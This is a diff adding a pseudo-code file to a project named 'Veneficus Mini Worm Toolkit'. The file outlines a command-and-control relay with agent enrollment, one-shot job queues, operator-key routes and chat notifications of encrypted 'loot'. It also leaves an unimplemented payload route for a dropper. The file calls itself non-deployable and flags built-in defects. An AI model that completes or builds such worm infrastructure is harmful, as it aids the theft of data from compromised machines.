@@ -1,0 +1,73 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# relay/edge_relay.pseudo
+# Edge-worker control plane. Pseudo-code, not a deployable worker.
+
+BINDINGS (secrets / KV, alias names):
+    CHAT_TOKEN, CHAT_ID, OPS_KEY
+    AGENTS     — enrolled agent_id -> JSON metadata
+    JOBS       — agent_id -> JSON array of job strings
+    PROFILES   — agent_id or "global" -> JSON
+
+FUNCTION valid(agent_id) -> bool:
+    AGENTS has key agent_id
+
+FUNCTION notify(text):
+    split into chat-size chunks
+    POST to the chat API
+    # Private implementation forwards only a TRUNCATED ciphertext,
+    # so loot is announced but not recoverable from the chat.
+
+FUNCTION require_ops(request) -> bool:
+    header "X-Ops-Key" equals OPS_KEY
+
+ROUTE POST /inbox:
+    json = body
+    REQUIRE valid(json.agent_id) else 403
+    notify truncated tag/ct/nonce/hmac
+    AGENTS[id].last_seen = now
+    RETURN 200
+    # Worker never holds the AEAD key and never decrypts.
+
+ROUTE POST /queue:
+    REQUIRE valid(agent_id)
+    jobs = JOBS[id] or []
+    delete JOBS[id]            # one-shot
+    RETURN { jobs }
+
+ROUTE POST /profile:
+    REQUIRE valid(agent_id)
+    RETURN PROFILES[id] or PROFILES["global"] or {}
+
+ROUTE POST /ops:
+    REQUIRE require_ops
+    append json.job onto JOBS[json.agent_id]
+
+ROUTE POST /enroll:
+    REQUIRE require_ops
+    AGENTS[id] = { registered: now, last_seen: null, note }
+
+ROUTE POST /revoke:
+    REQUIRE require_ops
+    delete AGENTS[id], JOBS[id]
+
+ROUTE GET /roster:
+    REQUIRE require_ops
+    RETURN { agents: keys(AGENTS), count }
+
+ROUTE POST /profile/set:
+    REQUIRE require_ops
+    PROFILES[json.agent_id or "global"] = json.profile
+
+ROUTE GET /payload:
+    # The dropper expects this. The private worker does not
+    # implement it. Outline it here as a hole, not as working code.
+
+DEFECTS TO KEEP VISIBLE:
+    Mixing "service-worker" event registration with module-style
+    secret bindings will throw at load and the worker never serves.
+    Rate limiting is mentioned in comments and not implemented.
